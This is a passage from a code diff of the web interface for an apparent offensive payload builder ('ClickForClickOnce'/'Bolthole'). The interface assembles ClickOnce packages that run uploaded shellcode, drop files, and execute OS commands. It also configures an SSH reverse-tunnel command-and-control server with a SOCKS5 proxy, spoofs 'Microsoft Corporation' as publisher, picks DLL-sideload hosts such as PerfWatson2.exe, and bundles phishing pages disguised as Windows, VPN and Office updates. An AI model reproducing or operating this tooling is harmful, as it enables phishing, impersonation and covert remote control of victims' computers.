-                            actionData = { type: 'run_code', file: codeReader.result.split(",")[1] };
-                            break;
-                        }
-                        case "drop_file": {
-                            const dropFileInput = document.getElementById(`dropfile-${originalIndex}`);
-                            const dropLocation  = document.getElementById(`droplocation-${originalIndex}`).value;
-                            if (!dropFileInput.files.length || !dropLocation) {
-                                showCfcoError(`Please complete all fields for Drop File action #${i+1}`);
-                                return;
-                            }
-                            const dropReader = new FileReader();
-                            dropReader.readAsDataURL(dropFileInput.files[0]);
-                            await new Promise(resolve => dropReader.onload = resolve);
-                            actionData = { type: 'drop_file', file: dropReader.result.split(",")[1], location: dropLocation };
-                            break;
-                        }
-                        case "run_cmd": {
-                            const command = document.getElementById(`command-${originalIndex}`).value;
-                            if (!command) { showCfcoError(`Please enter a command for Run OS Command action #${i+1}`); return; }
-                            actionData = { type: 'run_cmd', cmd: command };
-                            break;
-                        }
-                    }
-                    actions.push(actionData);
-                }
-
-                if (actions.length === 0) { showCfcoError("No actions specified"); return; }
-
-                const requestData = { name, action: actions, sideload, inflate };
-
-                try {
-                    showProcessingOverlay();
-                    const response = await fetch(
-                        new URL(window.location.origin + "/api/build").href,
-                        { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(requestData) }
-                    );
-                    hideProcessingOverlay();
-                    if (!response.ok) throw new Error(`Server Error: ${response.status}`);
-                    const responseData = await response.json();
-                    if (responseData.buildid) {
-                        showCfcoResults(responseData.buildid);
-                    } else {
-                        showCfcoError("No valid URL received from server.");
-                    }
-                } catch (error) {
-                    hideProcessingOverlay();
-                    showCfcoError(`Failed to submit request: ${error.message}`);
-                }
-            });
-
-            // ─── Bolthole tab init ─────────────────────────────────────────────────────
-
-            // Auto-generate application name
-            document.getElementById("bh-name").value = generateRandomName();
-
-            // Regenerate name button
-            document.getElementById("bh-regen-name").addEventListener("click", () => {
-                document.getElementById("bh-name").value = generateRandomName();
-            });
-
-            // Inflate slider
-            const bhInflateSlider = document.getElementById("bh-inflateSlider");
-            const bhInflateValue  = document.getElementById("bh-inflateValue");
-            bhInflateSlider.oninput = function() { bhInflateValue.textContent = this.value; };
-
-            // ── Dynamic key row helpers ───────────────────────────────────────────────
-
-            function getKeyValues(containerId) {
-                return Array.from(document.querySelectorAll('#' + containerId + ' textarea'))
-                    .map(t => t.value.trim())
-                    .filter(Boolean);
-            }
-
-            function addKeyRow(containerId, placeholder) {
-                const container = document.getElementById(containerId);
-                const row = document.createElement('div');
-                row.className = 'key-row';
-                const ta = document.createElement('textarea');
-                ta.placeholder = placeholder;
-                const btn = document.createElement('button');
-                btn.type = 'button';
-                btn.className = 'red-btn key-row-remove';
-                btn.textContent = '✕';
-                btn.addEventListener('click', () => row.remove());
-                row.appendChild(ta);
-                row.appendChild(btn);
-                container.appendChild(row);
-                ta.focus();
-            }
-
-            document.getElementById('bh-add-opkey').addEventListener('click', () => {
-                addKeyRow('bh-opkeys-container', 'ecdsa-sha2-nistp256 AAAA… operator@host');
-            });
-
-            // ── Global keypair / C2 config state ─────────────────────────────────────
-
-            let _bhPublicKey = null;  // current server-side public key, populated on load
-
-            function setBhKeypairUI(keypair) {
-                _bhPublicKey = keypair.public_key;
-                document.getElementById('bh-kp-loading').style.display = 'none';
-                if (keypair.exists && keypair.public_key) {
-                    document.getElementById('bh-kp-fingerprint').textContent = keypair.fingerprint || '';
-                    document.getElementById('bh-kp-pubkey').value = keypair.public_key;
-                    document.getElementById('bh-kp-info').style.display = '';
-                }
-            }
-
-            function populateC2Form(config) {
-                if (config.ssh_host)        document.getElementById("bh-sshHost").value        = config.ssh_host;
-                if (config.ssh_user)        document.getElementById("bh-sshUser").value        = config.ssh_user;
-                if (config.ports)           document.getElementById("bh-ports").value          = config.ports;
-                if (config.tunnel_port)     document.getElementById("bh-tunnelPort").value     = config.tunnel_port;
-                if (config.socks_port)      document.getElementById("bh-socksPort").value      = config.socks_port;
-                if (config.startup_delay !== undefined)   document.getElementById("bh-startupDelay").value   = config.startup_delay;
-                if (config.reconnect_delay !== undefined) document.getElementById("bh-reconnectDelay").value = config.reconnect_delay;
-            }
-
-            async function loadBhC2Config() {
-                try {
-                    const resp = await fetch(window.location.origin + "/api/bolthole/c2");
-                    if (!resp.ok) throw new Error("HTTP " + resp.status);
-                    const data = await resp.json();
-                    populateC2Form(data.config);
-                    setBhKeypairUI(data.keypair);
-                } catch (e) {
-                    document.getElementById('bh-kp-loading').textContent = "Failed to load keypair: " + e.message;
-                }
-            }
-
-            loadBhC2Config();
-
-            function getC2FormValues() {
-                return {
-                    ssh_host:        document.getElementById("bh-sshHost").value.trim(),
-                    ssh_user:        document.getElementById("bh-sshUser").value.trim(),
-                    ports:           document.getElementById("bh-ports").value.trim(),
-                    tunnel_port:     parseInt(document.getElementById("bh-tunnelPort").value),
-                    socks_port:      parseInt(document.getElementById("bh-socksPort").value),
-                    startup_delay:   parseInt(document.getElementById("bh-startupDelay").value),
-                    reconnect_delay: parseInt(document.getElementById("bh-reconnectDelay").value),
-                };
-            }
-
-            async function saveC2Config(regenerate) {
-                const body = Object.assign(getC2FormValues(), { regenerate_keypair: !!regenerate });
-                const resp = await fetch(window.location.origin + "/api/bolthole/c2", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(body),
-                });
-                if (!resp.ok) throw new Error("Server error " + resp.status);
-                return resp.json();
-            }
-
-            // ── Rotate keypair ────────────────────────────────────────────────────────
-
-            document.getElementById('bh-regen-keypair').addEventListener('click', async () => {
-                const warn = document.getElementById('bh-regen-warning');
-                warn.style.display = '';
-                const btn = document.getElementById('bh-regen-keypair');
-                btn.disabled = true;
-                btn.textContent = 'Rotating…';
-                try {
-                    const data = await saveC2Config(true);
-                    setBhKeypairUI(data.keypair);
-                    warn.textContent = 'Keypair rotated. Re-run c2_setup.sh and rebuild all packages.';
-                } catch (e) {
-                    warn.textContent = 'Rotation failed: ' + e.message;
-                } finally {
-                    btn.disabled = false;
-                    btn.textContent = '↻ Rotate Keypair';
-                }
-            });
-
-            // ── Step navigation ───────────────────────────────────────────────────────
-
-            function showBhStep1() {
-                document.getElementById('bh-step1').style.display = '';
-                document.getElementById('bh-step2').style.display = 'none';
-                document.getElementById('bh-si-1').classList.add('active');
-                document.getElementById('bh-si-2').classList.remove('active');
-                document.getElementById('bh-step1-error').style.display = 'none';
-            }
-
-            function showBhStep2() {
-                document.getElementById('bh-step1').style.display = 'none';
-                document.getElementById('bh-step2').style.display = '';
-                document.getElementById('bh-si-1').classList.remove('active');
-                document.getElementById('bh-si-2').classList.add('active');
-                document.getElementById('bh-errorMessage').style.display = 'none';
-            }
-
-            function showStep1Error(msg) {
-                const el = document.getElementById('bh-step1-error');
-                el.textContent = msg;
-                el.style.display = 'block';
-            }
-
-            function showBhError(msg) {
-                const el = document.getElementById('bh-errorMessage');
-                el.textContent = msg;
-                el.style.display = 'block';
-            }
-
-            function clearBhResults() {
-                document.getElementById("bh-resultsSection").style.display = "none";
-                document.getElementById("bh-errorMessage").style.display = "none";
-            }
-
-            function validateStep1() {
-                const sshHost = document.getElementById("bh-sshHost").value.trim();
-                const sshUser = document.getElementById("bh-sshUser").value.trim();
-                const ports   = document.getElementById("bh-ports").value.trim();
-                if (!sshHost) { showStep1Error("C2 Hostname is required."); return false; }
-                if (!sshUser) { showStep1Error("C2 SSH Username is required."); return false; }
-                if (!ports)   { showStep1Error("Port Scan Order is required."); return false; }
-                return true;
-            }
-
-            document.getElementById('bh-step1-next-btn').addEventListener('click', async () => {
-                document.getElementById('bh-step1-error').style.display = 'none';
-                if (!validateStep1()) return;
-                try {
-                    const data = await saveC2Config(false);
-                    setBhKeypairUI(data.keypair);
-                    showBhStep2();
-                } catch (e) {
-                    showStep1Error("Failed to save config: " + e.message);
-                }
-            });
-
-            document.getElementById('bh-step2-back-btn').addEventListener('click', () => {
-                showBhStep1();
-            });
-
-            // ── c2_setup.sh download ──────────────────────────────────────────────────
-
-            function buildC2SetupScript(cfg, pubkeyBlock) {
-                const portsArr     = cfg.ports.split(',').map(p => p.trim()).filter(Boolean);
-                const portsUfw     = portsArr.join(' ');
-                const portsListStr = portsArr.join(', ');
-                // $SSH_USER / $PORT / $TUNNEL_PORT are bash variables — plain $, NOT interpolated by JS.
-                return `#!/usr/bin/env bash
-# Bolthole C2 Setup Script — generated by ClickForClickOnce
-# ssh_host   : ${cfg.ssh_host}
-# ssh_user   : ${cfg.ssh_user}
-# ports      : ${portsListStr}
-# tunnel_port: ${cfg.tunnel_port}
-# socks5     : ${cfg.socks_port}
+            <div class="form-group">
+              <label>SSH Username</label>
+              <input type="text" id="bh-sshUser" placeholder="boltuser">
+            </div>
+          </div>
+          <div class="form-group">
+            <label>Port Probe Order</label>
+            <input type="text" id="bh-ports" value="443,80,22,31337">
+          </div>
+          <div class="form-row">
+            <div class="form-group">
+              <label>Tunnel Port Range</label>
+              <input type="text" id="bh-tunnelPort" value="31332-31345" placeholder="31332-31345 or 31332">
+            </div>
+            <div class="form-group">
+              <label>SOCKS5 Port</label>
+              <input type="number" id="bh-socksPort" value="1080" min="1" max="65535">
+            </div>
+          </div>
+          <div class="form-row">
+            <div class="form-group">
+              <label>Startup Delay (s)</label>
+              <input type="number" id="bh-startupDelay" value="5" min="0">
+            </div>
+            <div class="form-group">
+              <label>Reconnect Delay (s)</label>
+              <input type="number" id="bh-reconnectDelay" value="30" min="1">
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="section-card open" id="bh-kp-card">
+        <div class="section-header" onclick="toggleSection('bh-kp-card')">
+          <div class="step-badge">&#128273;</div>
+          <span class="section-title">Global Outbound Keypair</span>
+          <svg class="chevron" viewBox="0 0 16 16" fill="currentColor" width="14" height="14"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 01.708 0L8 10.293l5.646-5.647a.5.5 0 01.708.708l-6 6a.5.5 0 01-.708 0l-6-6a.5.5 0 010-.708z"/></svg>
+        </div>
+        <div class="section-body">
+          <div class="infobox"><strong>Note:</strong> This keypair is shared across all Bolthole builds. The C2 server needs a single <code style="font-family:monospace;background:var(--surface2);padding:1px 5px;border-radius:3px">authorized_keys</code> entry.</div>
+          <div class="pubkey-block" id="bh-kp-pubkey" onclick="selectAllText(this)">Loading&hellip;</div>
+          <div class="fingerprint" id="bh-kp-fingerprint"></div>
+          <div style="display:flex;gap:10px;margin-top:14px;flex-wrap:wrap">
+            <button class="btn btn-ghost btn-sm" onclick="saveC2Config(true)">&#8635; Rotate Keypair</button>
+            <button class="btn btn-ghost btn-sm" onclick="downloadC2Setup()">&#8659; c2_setup.sh</button>
+          </div>
+        </div>
+      </div>
+
+      <div style="display:flex;justify-content:flex-end;margin-top:4px">
+        <button class="btn btn-primary" onclick="goToBhStep2()">Next: Build Payload &rarr;</button>
+      </div>
+    </div><!-- end bh-step1 -->
+
+    <!-- BH Step 2 -->
+    <div class="bh-step" id="bh-step2">
+
+      <div class="section-card open" id="bh-id-card">
+        <div class="section-header" onclick="toggleSection('bh-id-card')">
+          <div class="step-badge">1</div>
+          <span class="section-title">Application Identity</span>
+          <svg class="chevron" viewBox="0 0 16 16" fill="currentColor" width="14" height="14"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 01.708 0L8 10.293l5.646-5.647a.5.5 0 01.708.708l-6 6a.5.5 0 01-.708 0l-6-6a.5.5 0 010-.708z"/></svg>
+        </div>
+        <div class="section-body">
+          <div class="form-row">
+            <div class="form-group">
+              <label>Application Name</label>
+              <input type="text" id="bh-name" placeholder="BoltApp">
+            </div>
+            <div class="form-group">
+              <label>Version</label>
+              <input type="text" id="bh-version" value="1.0.0.0">
+            </div>
+          </div>
+          <div class="form-row">
+            <div class="form-group">
+              <label>Publisher Name</label>
+              <input type="text" id="bh-publisher" value="Microsoft Corporation">
+            </div>
+            <div class="form-group">
+              <label>App Description</label>
+              <input type="text" id="bh-description" placeholder="Leave blank to use app name">
+            </div>
+          </div>
+          <div class="form-group">
+            <label>Provider URL (base hosting URL — <code>clickonce/AppName.application</code> is appended automatically)</label>
+            <input type="text" id="bh-providerUrl" placeholder="https://example.com" oninput="onProviderUrlChange()">
+          </div>
+          <div class="form-group">
+            <label>Custom Icon (.ico) &mdash; optional</label>
+            <label class="file-label">
+              <svg viewBox="0 0 16 16" fill="currentColor" width="16" height="16"><path d="M9.293 0H4a2 2 0 00-2 2v12a2 2 0 002 2h8a2 2 0 002-2V4.707A1 1 0 0013.707 4L10 .293A1 1 0 009.293 0zM9.5 3.5v-2l3 3h-2a1 1 0 01-1-1z"/></svg>
+              <span class="file-name" id="bhIconFileName">No file chosen &mdash; defaults to template icon</span>
+              <input type="file" id="bhIconFile" accept=".ico">
+            </label>
+          </div>
+        </div>
+      </div>
+
+      <div class="section-card open" id="bh-payload-card">
+        <div class="section-header" onclick="toggleSection('bh-payload-card')">
+          <div class="step-badge">2</div>
+          <span class="section-title">Payload Configuration</span>
+          <svg class="chevron" viewBox="0 0 16 16" fill="currentColor" width="14" height="14"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 01.708 0L8 10.293l5.646-5.647a.5.5 0 01.708.708l-6 6a.5.5 0 01-.708 0l-6-6a.5.5 0 010-.708z"/></svg>
+        </div>
+        <div class="section-body">
+          <div class="form-group">
+            <label>Sideload Target</label>
+            <div class="sideload-grid" id="bh-sideload-grid">
+              <label class="sideload-card selected" onclick="selectSideload(this,'bh')">
+                <input type="radio" name="bh-sideload" value="perfwatson2" checked>
+                <div class="sideload-card-icon">&#128202;</div>
+                <div class="sideload-card-text"><div class="name">PerfWatson2</div><div class="exe">PerfWatson2.exe</div></div>
+              </label>
+              <label class="sideload-card" onclick="selectSideload(this,'bh')">
+                <input type="radio" name="bh-sideload" value="tzsync">
+                <div class="sideload-card-icon">&#128336;</div>
+                <div class="sideload-card-text"><div class="name">TzSync</div><div class="exe">tzsync.exe</div></div>
+              </label>
+              <label class="sideload-card" onclick="selectSideload(this,'bh')">
+                <input type="radio" name="bh-sideload" value="systemhost">
+                <div class="sideload-card-icon">&#9881;</div>
+                <div class="sideload-card-text"><div class="name">ServiceHub Host</div><div class="exe">ServiceHub.Host.netfx.x64.exe</div></div>
+              </label>
+              <label class="sideload-card" onclick="selectSideload(this,'bh')">
+                <input type="radio" name="bh-sideload" value="powershell">
+                <div class="sideload-card-icon">&#128309;</div>
+                <div class="sideload-card-text"><div class="name">PowerShell ISE</div><div class="exe">powershell_ise.exe</div></div>
+              </label>
+            </div>
+          </div>
+          <div class="form-row" style="margin-top:14px">
+            <div class="form-group">
+              <label>Files Prefix</label>
+              <input type="text" id="bh-filesPrefix" value="bolt" placeholder="bolt" autocomplete="off">
+            </div>
+            <div class="form-group">
+              <label>Inflate Size</label>
+              <div class="slider-wrap">
+                <input type="range" id="bh-inflateSlider" min="0" max="500" value="0"
+                  oninput="document.getElementById('bh-inflateVal').textContent=this.value+' MB'">
+                <span class="slider-val" id="bh-inflateVal">0 MB</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="section-card open" id="bh-phish-card">
+        <div class="section-header" onclick="toggleSection('bh-phish-card')">
+          <div class="step-badge">3</div>
+          <span class="section-title">Phishing Page Template</span>
+          <svg class="chevron" viewBox="0 0 16 16" fill="currentColor" width="14" height="14"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 01.708 0L8 10.293l5.646-5.647a.5.5 0 01.708.708l-6 6a.5.5 0 01-.708 0l-6-6a.5.5 0 010-.708z"/></svg>
+        </div>
+        <div class="section-body">
+          <div class="phish-select-row">
+            <select id="bh-phishTemplate" onchange="onPhishTemplateChange()">
+              <option value="it_portal">IT Portal (Mandatory Update)</option>
+              <option value="microsoft_update">Windows Update (KB Security Patch)</option>
+              <option value="vpn_update">VPN Client Update</option>
+              <option value="office_update">Microsoft 365 / Office Update</option>
+            </select>
+            <button class="btn btn-ghost btn-sm" onclick="togglePhishPreview()">&#128065; Preview</button>
+          </div>
+          <div class="phish-preview-wrap" id="phishPreviewWrap">
+            <div class="phish-preview-bar">
+              <span id="phishPreviewLabel">Preview</span>
+              <button class="btn btn-ghost btn-sm" onclick="togglePhishPreview()" style="padding:3px 10px;font-size:.72rem">Close</button>
+            </div>
+            <iframe id="phishPreviewFrame" sandbox="allow-same-origin" title="Phish page preview"></iframe>
+          </div>
+          <p style="font-size:.78rem;color:var(--text2);margin-top:12px">
+            The selected page is included as <code style="font-family:monospace;background:var(--surface2);padding:1px 5px;border-radius:3px;color:var(--accent)">index.html</code> at the zip root.
+            Server configs (IIS, Apache, nginx, Caddy) are also at the root. ClickOnce files are in <code style="font-family:monospace;background:var(--surface2);padding:1px 5px;border-radius:3px;color:var(--accent)">clickonce/</code>.
+          </p>
+        </div>
+      </div>
+
+      <div class="section-card" id="bh-opkeys-card">
+        <div class="section-header" onclick="toggleSection('bh-opkeys-card')">
+          <div class="step-badge">4</div>
+          <span class="section-title">Operator Public Keys</span>
+          <svg class="chevron" viewBox="0 0 16 16" fill="currentColor" width="14" height="14"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 01.708 0L8 10.293l5.646-5.647a.5.5 0 01.708.708l-6 6a.5.5 0 01-.708 0l-6-6a.5.5 0 010-.708z"/></svg>
+        </div>
+        <div class="section-body">
+          <div class="infobox">A per-build ECDSA-256 operator keypair is auto-generated. Add extra public keys here for additional operators.</div>
+          <div id="bh-opkeys-container"></div>
+          <button class="btn btn-ghost btn-sm" onclick="addOpKey()" style="margin-top:8px">+ Add Key</button>
+        </div>
+      </div>
+
+      <div class="section-card open" id="bh-build-card">
+        <div class="section-header" onclick="toggleSection('bh-build-card')">
+          <div class="step-badge">5</div>
+          <span class="section-title">Build</span>
+          <svg class="chevron" viewBox="0 0 16 16" fill="currentColor" width="14" height="14"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 01.708 0L8 10.293l5.646-5.647a.5.5 0 01.708.708l-6 6a.5.5 0 01-.708 0l-6-6a.5.5 0 010-.708z"/></svg>
+        </div>
+        <div class="section-body">
+          <div style="display:flex;gap:10px;flex-wrap:wrap">
+            <button class="btn btn-ghost" onclick="showBhStep1()">&larr; Back</button>
+            <button class="btn btn-primary" id="bh-submitBtn" onclick="submitBolthole()" style="flex:1">Build Bolthole Payload</button>
+            <button class="btn btn-ghost btn-reopen" id="bhReopenBtn" onclick="reopenLastBuild()" title="View last build log">&#128196; Last Build</button>
+          </div>
+          <div class="error-banner" id="bhError"></div>
+        </div>
+      </div>
+
+    </div><!-- end bh-step2 -->
+  </div><!-- end bolthole-tab -->
+
+  <!-- ══════════ HISTORY TAB ══════════ -->
+  <div class="tab-content" id="history-tab">
+    <div class="section-card open">
+      <div class="section-header" style="cursor:default">
+        <svg viewBox="0 0 16 16" fill="currentColor" width="16" height="16" style="flex-shrink:0"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm0 1a6 6 0 110 12A6 6 0 018 2zM7.5 4v4.25l3 1.5.5-.87-2.5-1.25V4H7.5z"/></svg>
+        <span class="section-title">Build History</span>
+        <button class="btn btn-ghost btn-sm" onclick="loadHistory()" style="margin-left:auto">&#8635; Refresh</button>
+      </div>
+      <div class="section-body">
+        <div id="historyContent"><p class="history-empty">Loading&hellip;</p></div>
+      </div>
+    </div>
+  </div><!-- end history-tab -->
+
+</div><!-- end .app -->
+
+<!-- ════════ BUILD LOG MODAL ════════ -->
+<div class="modal-backdrop hidden" id="logModal">
+  <div class="modal">
+    <div class="modal-header">
+      <h2>Build Log</h2>
+      <span class="buildid-badge" id="modalBuildId"></span>
+      <a class="btn btn-ghost btn-sm" id="modalDirLink" href="#" target="_blank" style="text-decoration:none">Browse Dir</a>
+      <button class="modal-close" onclick="closeLogModal()" aria-label="Close">&times;</button>
+    </div>
+    <div class="log-status-bar">
+      <div class="log-pulse" id="logPulse"></div>
+      <span id="logStatusText">Building&hellip;</span>
+    </div>
+    <div class="log-body">
+      <pre id="logContent"></pre>
+    </div>
+    <div class="results-panel" id="resultsPanel">
+      <h3>Build Complete &mdash; Downloads</h3>
+      <div class="result-links" id="resultLinks"></div>
+      <div class="ops-box" id="opsBox" style="display:none"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ── State ──────────────────────────────────────────────────────────────────
+let actionCounter = 0;
+let _logPollTimer = null;
+let _currentBuildId = null;
+let _historyRefreshTimer = null;
+let _cfcoIconB64 = '';
+let _bhIconB64   = '';
+let _bhPublicKey = '';
+let _phishCache  = {};
+let _phishPreviewVisible = false;
+let _resultsShown = false;
+
+const adjectives = ['Alpha','Beta','Gamma','Delta','Echo','Foxtrot','Golf','Hotel',
+  'India','Juliet','Kilo','Lima','Mike','Nova','Oscar','Papa','Sierra','Tango',
+  'Uniform','Victor','Whiskey','Zulu','Amber','Carbon','Cobalt','Cyan',
+  'Ember','Falcon','Ghost','Helios','Iron','Jade','Kernel','Lynx','Marble',
+  'Nebula','Onyx','Prism','Quasar','Raven','Solar','Talon','Umbra','Vortex'];
+const nouns = ['Anvil','Arrow','Bolt','Bridge','Canvas','Chain','Circuit','Cloud',
+  'Comet','Conduit','Crypt','Dagger','Deck','Depot','Drift','Eagle','Ember',
+  'Forge','Frame','Gate','Graph','Grid','Harbor','Haven','Index','Kernel',
+  'Lance','Layer','Matrix','Module','Nexus','Node','Orbit','Panel','Patch',
+  'Phase','Pipe','Plane','Probe','Proxy','Relay','Ridge','Route','Shield',
+  'Signal','Slate','Spark','Stack','Storm','Surge','Tide','Token','Vault','Vector'];
+
+function randomName() {
+  return adjectives[Math.floor(Math.random()*adjectives.length)] +
+         nouns[Math.floor(Math.random()*nouns.length)];
+}
+
+// ── Init ───────────────────────────────────────────────────────────────────
+window.addEventListener('DOMContentLoaded', () => {
+  document.getElementById('nameInput').value = randomName();
+  document.getElementById('bh-name').value   = randomName();
+  loadBhC2Config();
+  wireIconPicker('iconFile',   'iconFileName',   v => { _cfcoIconB64 = v; });
+  wireIconPicker('bhIconFile', 'bhIconFileName', v => { _bhIconB64   = v; });
+});
+
+// ── Tabs ───────────────────────────────────────────────────────────────────
+function switchTab(tab) {
+  ['cfco','bolthole','history'].forEach(t => {
+    document.getElementById(t+'-tab').classList.toggle('active', t===tab);
+    document.getElementById('tab-'+t).classList.toggle('active', t===tab);
+  });
+  if (tab === 'history') loadHistory();
+}
+
+// ── Accordion ─────────────────────────────────────────────────────────────
+function toggleSection(id) {
+  document.getElementById(id).classList.toggle('open');
+}
+
+// ── Sideload grid ─────────────────────────────────────────────────────────
+function selectSideload(el, prefix) {
+  document.querySelectorAll(`#${prefix}-sideload-grid .sideload-card`).forEach(c => c.classList.remove('selected'));
+  el.classList.add('selected');
+  el.querySelector('input[type=radio]').checked = true;
+}
+
+// ── Icon picker ───────────────────────────────────────────────────────────
+function wireIconPicker(inputId, labelId, cb) {
+  document.getElementById(inputId).addEventListener('change', function() {
+    const file = this.files[0];
+    if (!file) return;
+    document.getElementById(labelId).textContent = file.name;
+    const fr = new FileReader();
+    fr.onload = e => cb(e.target.result.split(',')[1]);
+    fr.readAsDataURL(file);
+  });
+}
+
+// ── Action cards ──────────────────────────────────────────────────────────
+function addAction() {
+  const type = document.getElementById('actionType').value;
+  const idx  = ++actionCounter;
+  const labels = { run_code:'Run Shellcode', drop_file:'Drop File', run_cmd:'Run OS Command' };
+  const badges = { run_code:'badge-run-code', drop_file:'badge-drop-file', run_cmd:'badge-run-cmd' };
+
+  let body = '';
+  if (type === 'run_code') {
+    body = `<div class="form-group"><label>Shellcode Binary</label>
+      <label class="file-label"><svg viewBox="0 0 16 16" fill="currentColor" width="16" height="16"><path d="M9.293 0H4a2 2 0 00-2 2v12a2 2 0 002 2h8a2 2 0 002-2V4.707A1 1 0 0013.707 4L10 .293A1 1 0 009.293 0zM9.5 3.5v-2l3 3h-2a1 1 0 01-1-1z"/></svg>
+        <span class="file-name" id="fn-${idx}">No file chosen</span>
+        <input type="file" id="codefile-${idx}" onchange="document.getElementById('fn-${idx}').textContent=this.files[0]?.name||'No file chosen'">
+      </label></div>`;
+  } else if (type === 'drop_file') {
+    body = `<div class="form-group"><label>File to Drop</label>
+      <label class="file-label"><svg viewBox="0 0 16 16" fill="currentColor" width="16" height="16"><path d="M9.293 0H4a2 2 0 00-2 2v12a2 2 0 002 2h8a2 2 0 002-2V4.707A1 1 0 0013.707 4L10 .293A1 1 0 009.293 0zM9.5 3.5v-2l3 3h-2a1 1 0 01-1-1z"/></svg>
+        <span class="file-name" id="fn-${idx}">No file chosen</span>
+        <input type="file" id="dropfile-${idx}" onchange="document.getElementById('fn-${idx}').textContent=this.files[0]?.name||'No file chosen'">
+      </label></div>
+      <div class="form-group"><label>Drop Location (Windows path)</label>
+        <input type="text" id="droplocation-${idx}" placeholder="C:\\Users\\Public\\file.exe">
+      </div>`;
+  } else {
+    body = `<div class="form-group"><label>Command</label>
+      <input type="text" id="command-${idx}" placeholder="cmd.exe /c calc.exe">
+    </div>`;
+  }
+
+  const card = document.createElement('div');
+  card.className = 'action-card';
+  card.dataset.type = type;
+  card.dataset.idx  = idx;
+  card.innerHTML = `
+    <div class="action-card-header">
+      <svg viewBox="0 0 16 16" fill="currentColor" width="14" height="14" style="color:var(--text2)"><path d="M4 6h8v1H4V6zm0 3h8v1H4V9z"/></svg>
+      <span class="action-card-badge ${badges[type]}">${type.replace('_',' ')}</span>
+      <span class="action-card-title">${labels[type]}</span>
+      <button class="btn-remove" onclick="this.closest('.action-card').remove()">&times;</button>
+    </div>
+    <div class="action-card-body">${body}</div>`;
+
+  document.getElementById('actionCards').appendChild(card);
+  if (!window._sortable) {
+    window._sortable = Sortable.create(document.getElementById('actionCards'), {
+      animation: 150, handle: '.action-card-header', ghostClass: 'sortable-ghost'
+    });
+  }
+}
+
+function selectAllText(el) {
+  const range = document.createRange();
+  range.selectNodeContents(el);
+  const sel = window.getSelection();
+  sel.removeAllRanges();
+  sel.addRange(range);
+}
+
+// ── Bolthole navigation ────────────────────────────────────────────────────
+async function goToBhStep2() {
+  await saveC2Config(false);
+  document.getElementById('bh-step1').classList.remove('active');
+  document.getElementById('bh-step2').classList.add('active');
+  document.getElementById('bh-dot-1').classList.remove('active');
+  document.getElementById('bh-dot-1').classList.add('done');
+  document.getElementById('bh-dot-2').classList.add('active');
+}
+function showBhStep1() {
+  document.getElementById('bh-step2').classList.remove('active');
+  document.getElementById('bh-step1').classList.add('active');
+  document.getElementById('bh-dot-2').classList.remove('active');
+  document.getElementById('bh-dot-1').classList.remove('done');
+  document.getElementById('bh-dot-1').classList.add('active');
+}
+
+// ── Operator keys ─────────────────────────────────────────────────────────
+function addOpKey() {
+  const row = document.createElement('div');
+  row.className = 'key-row';
+  row.innerHTML = `<textarea rows="2" placeholder="ssh-ed25519 AAAA..."></textarea>
+    <button class="btn-remove" onclick="this.closest('.key-row').remove()">&times;</button>`;
+  document.getElementById('bh-opkeys-container').appendChild(row);
+}
+
+// ── C2 config ─────────────────────────────────────────────────────────────
+async function loadBhC2Config() {
+  try {
+    const r = await fetch('/api/bolthole/c2');
+    applyC2Config(await r.json());
+  } catch(_) {
+    document.getElementById('bh-kp-pubkey').textContent = 'Failed to load keypair.';
+  }
+}
+async function saveC2Config(regenerate) {
+  const body = {
+    ssh_host:         document.getElementById('bh-sshHost').value,
+    ssh_user:         document.getElementById('bh-sshUser').value,
+    ports:            document.getElementById('bh-ports').value,
+    tunnel_port_range: document.getElementById('bh-tunnelPort').value.trim()||'31332-31345',
+    socks_port:       parseInt(document.getElementById('bh-socksPort').value)||1080,
+    startup_delay:    parseInt(document.getElementById('bh-startupDelay').value)||5,
+    reconnect_delay:  parseInt(document.getElementById('bh-reconnectDelay').value)||30,
+    regenerate_keypair: !!regenerate,
+  };
+  const r = await fetch('/api/bolthole/c2', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body) });
+  applyC2Config(await r.json());
+}
+function applyC2Config(d) {
+  if (d.config) {
+    document.getElementById('bh-sshHost').value        = d.config.ssh_host||'';
+    document.getElementById('bh-sshUser').value        = d.config.ssh_user||'';
+    document.getElementById('bh-ports').value          = d.config.ports||'443,80,22,31337';
+    document.getElementById('bh-tunnelPort').value     = d.config.tunnel_port_range||'31332-31345';
+    document.getElementById('bh-socksPort').value      = d.config.socks_port||1080;
+    document.getElementById('bh-startupDelay').value   = d.config.startup_delay||5;
+    document.getElementById('bh-reconnectDelay').value = d.config.reconnect_delay||30;
+  }
+  if (d.keypair && d.keypair.exists) {
+    _bhPublicKey = d.keypair.public_key;
+    document.getElementById('bh-kp-pubkey').textContent      = d.keypair.public_key;
+    document.getElementById('bh-kp-fingerprint').textContent = 'SHA256: ' + (d.keypair.fingerprint||'');
+  }
+}
+async function downloadC2Setup() {
+  await saveC2Config(false);
+  const r = await fetch('/api/bolthole/c2');
+  const d = await r.json();
+  const pub = (d.keypair?.public_key||'').trim();
+  const cfg = d.config||{};
+  const sshUser  = cfg.ssh_user||'boltuser';
+  const sshHost  = cfg.ssh_host||'';
+  const portsArr = (cfg.ports||'443,80,22,31337').split(',').map(p=>p.trim()).filter(Boolean);
+  const portsList = portsArr.join(', ');
+  const portsLoop = portsArr.join(' ');
+  const tunnelRange = cfg.tunnel_port_range||'31332-31345';
+  const socksPort   = cfg.socks_port||1080;
+
+  const script = `#!/usr/bin/env bash
+# Bolthole C2 Setup Script
+# ssh_host     : ${sshHost}
+# ssh_user     : ${sshUser}
+# ports        : ${portsList}
+# tunnel_range : ${tunnelRange}
+# socks5       : ${socksPort}
 set -e
 
-SSH_USER="${cfg.ssh_user}"
-TUNNEL_PORT=${cfg.tunnel_port}
+SSH_USER="${sshUser}"
 
-echo "[*] Creating user $SSH_USER (no-login shell) ..."
+echo "[*] Creating user $SSH_USER (nologin shell) ..."
